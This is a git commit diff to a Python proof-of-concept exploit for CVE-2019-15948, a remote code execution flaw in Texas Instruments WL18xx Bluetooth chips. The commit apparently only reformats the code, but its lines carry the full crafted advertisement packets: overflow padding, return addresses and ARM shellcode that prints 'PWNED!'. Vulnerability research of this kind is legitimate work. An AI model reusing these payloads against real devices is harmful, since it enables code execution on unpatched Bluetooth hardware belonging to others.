7b55155333c7860a627c8dfcfa3fe0f5ab9b7168
Veronica Kovah <veronica@darkmentor.com>
2020-07-26 08:49:56 -0700

    Cleaned up code, modified description

--- host/pocs/ti_wl18xx_adv_rce.py
+++ host/pocs/ti_wl18xx_adv_rce.py
@@ -4,7 +4,7 @@ class TestSet():
     def __init__(self, subparsers):
         self.cmd = 'ti_adv_rce'
 
-        self.parser = subparsers.add_parser(self.cmd, help='Texas Instruments WL18xx CVE_2019-15948 RCE PoC')
+        self.parser = subparsers.add_parser(self.cmd, help='[CVE-2019-15948] Texas Instruments WL18xx RCE PoC')
         self.parser.add_argument('action', choices=['crash', 'poc', 'demo'], help='Choose an action')
         self.funcs = {'crash':self.crash, 'poc':self.poc, 'demo':self.demo}
 
@@ -70,14 +70,14 @@ class TestSet():
         # max packet should be 37
 
         # hardcoded data struct for "PWNED!"
-        pkt01 = b"\x41\x41\x41\x41\x41"
-        pkt01 += b"\xf1\x39\x08\x20"
-        pkt01 += b"\x41\x41\x41"
-        pkt01 += b"\x41\x41\x2c\x3a\x08\x20"
-        pkt01 += b"\x08\x00\x00\x00\x34\x3a\x08\x20\x07\x09\x50\x57\x4e\x45\x44\x21"
+        pkt01  = b"\x41\x41\x41\x41\x41\xf1\x39\x08\x20\x41\x41\x41\x41\x41\x2c\x3a"
+        pkt01 += b"\x08\x20\x08\x00\x00\x00\x34\x3a\x08\x20\x07\x09\x50\x57\x4e\x45"
+        pkt01 += b"\x44\x21"
 
         # refer pwned.s
-        pkt02 = b"\x41\x41\x41\x41\x41\xf1\x39\x08\x20\x41\x4d\xf2\xd5\x15\xc0\xf2\x08\x05\x0b\x49\x0a\x20\xa8\x47\x01\x21\x04\x20\xa8\x47\xbf\xf3\x6f\x8f\xfc\xe7"
+        pkt02  = b"\x41\x41\x41\x41\x41\xf1\x39\x08\x20\x41\x4d\xf2\xd5\x15\xc0\xf2"
+        pkt02 += b"\x08\x05\x0b\x49\x0a\x20\xa8\x47\x01\x21\x04\x20\xa8\x47\xbf\xf3"
+        pkt02 += b"\x6f\x8f\xfc\xe7"
 
         pkts = [pkt01, pkt02]
 
